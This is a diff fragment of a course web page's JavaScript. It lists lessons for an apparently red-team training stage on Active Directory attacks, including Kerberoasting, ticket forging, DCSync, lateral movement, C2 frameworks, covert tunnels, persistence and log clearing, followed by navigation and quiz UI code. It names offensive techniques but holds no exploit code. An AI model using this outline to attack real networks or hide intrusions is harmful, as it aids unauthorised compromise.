+  {id:'l2-1',ch:'CH2',title:'AD 架構：域 / 樹 / 森林 / 信任',time:'25分鐘',type:'AD 基礎'},
+  {id:'l2-2',ch:'CH2',title:'Kerberos 認證協議深入解析',time:'30分鐘',type:'Kerberos'},
+  {id:'l2-3',ch:'CH2',title:'LDAP 查詢與 BloodHound 域枚舉',time:'30分鐘',type:'BloodHound'},
+  {id:'l2-4',ch:'CH2',title:'PowerView / ADExplorer 偵察',time:'25分鐘',type:'PowerView'},
+  {id:'l3-1',ch:'CH3',title:'Kerberoasting：服務帳號 Hash 提取',time:'25分鐘',type:'Kerberoasting'},
+  {id:'l3-2',ch:'CH3',title:'AS-REP Roasting：無預認證攻擊',time:'20分鐘',type:'AS-REP'},
+  {id:'l3-3',ch:'CH3',title:'Pass-the-Hash / Pass-the-Ticket',time:'25分鐘',type:'PtH / PtT'},
+  {id:'l3-4',ch:'CH3',title:'Golden Ticket / Silver Ticket 偽造',time:'30分鐘',type:'票證偽造'},
+  {id:'l3-5',ch:'CH3',title:'DCSync：模擬域控拉取 Hash',time:'20分鐘',type:'DCSync'},
+  {id:'l4-1',ch:'CH4',title:'WMI / WinRM 遠端執行',time:'25分鐘',type:'遠端執行'},
+  {id:'l4-2',ch:'CH4',title:'PsExec / SMBExec / SmbClient',time:'20分鐘',type:'SMB 移動'},
+  {id:'l4-3',ch:'CH4',title:'RDP 橫向移動與 RDP 劫持',time:'20分鐘',type:'RDP'},
+  {id:'l4-4',ch:'CH4',title:'Token 竊取與 Impersonation',time:'25分鐘',type:'Token 提權'},
+  {id:'l5-1',ch:'CH5',title:'流量隧道：SSH / Frp / Chisel',time:'30分鐘',type:'隧道穿透'},
+  {id:'l5-2',ch:'CH5',title:'SOCKS5 代理鏈：proxychains',time:'20分鐘',type:'代理鏈'},
+  {id:'l5-3',ch:'CH5',title:'C2 框架：Cobalt Strike / Sliver',time:'30分鐘',type:'C2 框架'},
+  {id:'l5-4',ch:'CH5',title:'DNS / ICMP 隱蔽隧道',time:'25分鐘',type:'隱蔽通訊'},
+  {id:'l6-1',ch:'CH6',title:'持久化技術：計劃任務 / 服務 / 登錄表',time:'25分鐘',type:'持久化'},
+  {id:'l6-2',ch:'CH6',title:'日誌清理與痕跡消除',time:'20分鐘',type:'清理'},
+  {id:'l6-3',ch:'CH6',title:'OPSEC 操作安全原則',time:'20分鐘',type:'OPSEC'},
+];
+const done=new Set(JSON.parse(localStorage.getItem('s7_done')||'[]'));
+let cur=0;
+function go(id,btn){
+  document.querySelectorAll('.cb').forEach(b=>b.classList.remove('on'));
+  document.querySelectorAll('.ls-btn').forEach(b=>b.classList.remove('lact'));
+  const bl=document.getElementById(id);if(bl)bl.classList.add('on');
+  if(btn)btn.classList.add('lact');
+  cur=LS.findIndex(l=>l.id===id);syncUI();
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+function toggleCh(btn,id){
+  btn.classList.toggle('copen');
+  const l=document.getElementById(id);if(l)l.classList.toggle('lopen');
+}
+function prevL(){if(cur>0)findAndGo(LS[cur-1].id);}
+function nextL(){
+  done.add(LS[cur].id);
+  localStorage.setItem('s7_done',JSON.stringify([...done]));
+  if(cur<LS.length-1)findAndGo(LS[cur+1].id);
+}
+function findAndGo(id){
+  let btn=null;
+  document.querySelectorAll('.ls-btn').forEach(b=>{
+    if((b.getAttribute('onclick')||'').includes("'"+id+"'")){
+      btn=b;
+      const p=b.parentElement;
+      if(p&&!p.classList.contains('lopen')){
+        p.classList.add('lopen');
+        const cb=p.previousElementSibling;
+        if(cb)cb.classList.add('copen');
+      }
+    }
+  });
+  go(id,btn);
+}
+function syncUI(){
+  const l=LS[cur];if(!l)return;
+  document.getElementById('crumb').innerHTML=`STAGE 07 &gt; ${l.ch} &gt; <em>${l.title}</em>`;
+  document.getElementById('ltitle').textContent=l.title;
+  document.getElementById('chip1').textContent=l.type;
+  document.getElementById('chip2').textContent=`預計 ${l.time}`;
+  document.getElementById('cnt').textContent=`${cur+1} / ${LS.length}`;
+  document.getElementById('lsub').textContent=l.title;
+  document.getElementById('prevb').disabled=cur===0;
+  document.getElementById('nextb').disabled=cur===LS.length-1;
+  if(cur===LS.length-1)document.getElementById('nextb').textContent='Stage 完成';
+  else document.getElementById('nextb').innerHTML='下一課 &#8594;';
+  const pct=done.size?Math.round(done.size/LS.length*100):0;
+  document.getElementById('pct').textContent=pct+'%';
+  document.getElementById('pf').style.width=pct+'%';
+  document.querySelectorAll('.ls-btn').forEach(b=>{
+    const m=(b.getAttribute('onclick')||'').match(/'(l\d+-\d+)'/);
+    if(m&&done.has(m[1])&&!b.classList.contains('lact'))b.classList.add('ldone');
+  });
+}
+function chkQ(el,correct){
+  const box=el.closest('.quiz');
+  if(box.dataset.answered)return;
+  box.dataset.answered='1';
+  box.querySelectorAll('.qo').forEach(o=>o.style.pointerEvents='none');
+  el.classList.add(correct?'ok':'bad');
+  if(!correct)box.querySelectorAll('.qo').forEach(o=>{
+    if((o.getAttribute('onclick')||'').includes('true'))o.classList.add('ok');
+  });
+  const exp=box.querySelector('.q-exp');
+  if(exp)exp.classList.add('on');
+}
+function cpCode(btn){
+  const pre=btn.closest('.cblock').querySelector('pre');
+  navigator.clipboard.writeText(pre.innerText).then(()=>{
+    btn.textContent='已複製';setTimeout(()=>btn.textContent='複製',2000);
+  });
+}
+syncUI();
+</script>
+</body>
+</html>
